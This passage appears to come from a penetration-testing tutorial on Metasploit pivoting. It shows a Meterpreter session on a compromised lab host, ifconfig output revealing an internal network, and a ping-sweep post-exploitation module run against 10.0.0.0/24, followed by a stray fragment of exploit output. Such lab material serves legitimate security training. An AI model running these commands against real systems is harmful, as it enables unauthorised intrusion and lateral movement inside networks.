3. With our newly created Meterpreter session, we can use the `ifconfig` command on the target to see the available interfaces:

```
msf exploit(usermap_script) > sessions 2
[*] Starting interaction with 2...

meterpreter > ifconfig

Interface 1
==========
Name          : lo
Hardware MAC  : 00:00:00:00:00:00
MTU           : 16436
Flags         : UP, LOOPBACK
IPv4 Address  : 127.0.0.1
IPv4 Netmask  : 255.0.0.0
IPv6 Address  : ::1
IPv6 Netmask  : ffff:ffff:ffff:ffff:ffff:ffff::

...

meterpreter >
```

As you can see, the target node has three interfaces. The `LOOPBACK` interface, one with the IP address of 192.168.216.129, which is connected to the internet, and the other with 10.0.0.128, which is the IP interface for the internal network.

4. Our next aim will be to find which systems are available on this local network. To do this, we will use the Multi Gather Ping Sweep post-exploitation module:

```
meterpreter > background
[*] Backgrounding session 2...
msf exploit(usermap_script) > use post/multi/
gather/ping_sweep
msf post(ping_sweep) > set RHOSTS 10.0.0.0/24
RHOSTS => 10.0.0.0/24
msf post(ping_sweep) > set SESSION 2
SESSION => 2
msf post(ping_sweep) > run

[*] Performing ping sweep for IP range 10.0.0.0/24
```

```
-> 192.168.216.129:41206) at 2017-12-08 06:37:13 -0500
[*] Command stager progress: 100.00% (736/736 bytes)
msf exploit(usermap_script) >
```